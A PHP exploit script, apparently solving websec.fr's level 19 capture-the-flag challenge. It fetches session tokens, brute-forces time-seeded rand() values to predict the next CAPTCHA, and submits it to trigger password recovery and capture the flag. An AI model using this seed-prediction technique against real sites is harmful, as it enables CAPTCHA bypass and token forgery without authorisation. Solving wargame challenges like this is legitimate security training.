<?php
error_reporting(0);

function generate_random_text($length) {
    $chars  = "abcdefghijklmnopqrstuvwxyz";
    $chars .= "ABCDEFGHIJKLMNOPQRSTUVWXYZ";
    $chars .= "1234567890";

    $text = '';
    for($i = 0; $i < $length; $i++) {
        $text .= $chars[rand() % strlen($chars)];
    }
    return $text;
}

echo "╔════════════════════════════════════════════════════════════╗\n";
echo "║    STATEFUL PRNG ATTACK - State Continuity Test           ║\n";
echo "╚════════════════════════════════════════════════════════════╝\n\n";

$attempt = 0;

while (true) {
    $attempt++;
    
    echo "\n[Attempt $attempt] Testing stateful PRNG hypothesis...\n";
    
    // Obtener DOS tokens seguidos de la misma sesión
    $ch = curl_init("https://websec.fr/level19/index.php");
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_HEADER, true);
    curl_setopt($ch, CURLOPT_COOKIEJAR, '/tmp/session_cookies.txt');
    curl_setopt($ch, CURLOPT_COOKIEFILE, '/tmp/session_cookies.txt');
    $response1 = curl_exec($ch);
    curl_close($ch);
    
    if (!$response1) continue;
    
    if (!preg_match('/PHPSESSID=([a-z0-9]+)/i', $response1, $matches)) continue;
    $session_id = $matches[1];
    
    $parts1 = explode("\r\n\r\n", $response1, 2);
    $body1 = isset($parts1[1]) ? $parts1[1] : $response1;
    
    if (!preg_match('/name="token" value="([^"]+)"/', $body1, $token_match1)) continue;
    $token1 = $token_match1[1];
    
    echo "  Token 1: $token1\n";
    
    // Segunda request con la MISMA sesión
    sleep(1);
    
    $ch = curl_init("https://websec.fr/level19/index.php");
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_HEADER, true);
    curl_setopt($ch, CURLOPT_COOKIEJAR, '/tmp/session_cookies.txt');
    curl_setopt($ch, CURLOPT_COOKIEFILE, '/tmp/session_cookies.txt');
    $response2 = curl_exec($ch);
    curl_close($ch);
    
    if (!$response2) continue;
    
    $parts2 = explode("\r\n\r\n", $response2, 2);
    $body2 = isset($parts2[1]) ? $parts2[1] : $response2;
    
    if (!preg_match('/name="token" value="([^"]+)"/', $body2, $token_match2)) continue;
    $token2 = $token_match2[1];
    
    echo "  Token 2: $token2\n";
    
    // Si los tokens son iguales, el PRNG NO se reinicializa
    if ($token1 === $token2) {
        echo "  [!] Tokens are IDENTICAL - PRNG not reseeded!\n";
    } else {
        echo "  [*] Tokens are different\n";
        
        // Intentar encontrar una secuencia de seeds que produzca ambos tokens
        $current_time = time();
        
        for ($offset = -3600; $offset <= 300; $offset++) {
            $seed = $current_time + $offset;
            
            srand($seed);
            $test_token1 = generate_random_text(32);
            
            if ($test_token1 === $token1) {
                // ¡Encontramos el seed para el primer token!
                // Ahora generar el siguiente sin resetear
                $test_token2 = generate_random_text(32);
                
                if ($test_token2 === $token2) {
                    echo "\n  ✓✓✓ FOUND SEED SEQUENCE! ✓✓✓\n";
                    echo "  Seed: $seed\n";
                    echo "  Both tokens matched in sequence!\n";
                    
                    // El siguiente debería ser el captcha
                    $captcha = generate_random_text(25);
                    echo "  Predicted next CAPTCHA: $captcha\n";
                    
                    // Intentar usarlo
                    $post_data = http_build_query([
                        'captcha' => $captcha,
                        'token' => $token2,
                        'submit' => ''
                    ]);
                    
                    $ch = curl_init("https://websec.fr/level19/index.php");
                    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
                    curl_setopt($ch, CURLOPT_POST, true);
                    curl_setopt($ch, CURLOPT_POSTFIELDS, $post_data);
                    curl_setopt($ch, CURLOPT_COOKIEJAR, '/tmp/session_cookies.txt');
                    curl_setopt($ch, CURLOPT_COOKIEFILE, '/tmp/session_cookies.txt');
                    $result = curl_exec($ch);
                    curl_close($ch);
                    
                    if (strpos($result, 'Password recovery email sent') !== false) {
                        echo "\n  SUCCESS!\n";
                        if (preg_match('/WEBSEC\{[^}]+\}/', $result, $flag_match)) {
                            echo "  FLAG: " . $flag_match[0] . "\n";
                            file_put_contents('/workspace/websec_level19/FLAG.txt', $flag_match[0] . "\n");
                            exit(0);
                        }
                    }
                }
            }
        }
    }
    
    usleep(500000);
}
?>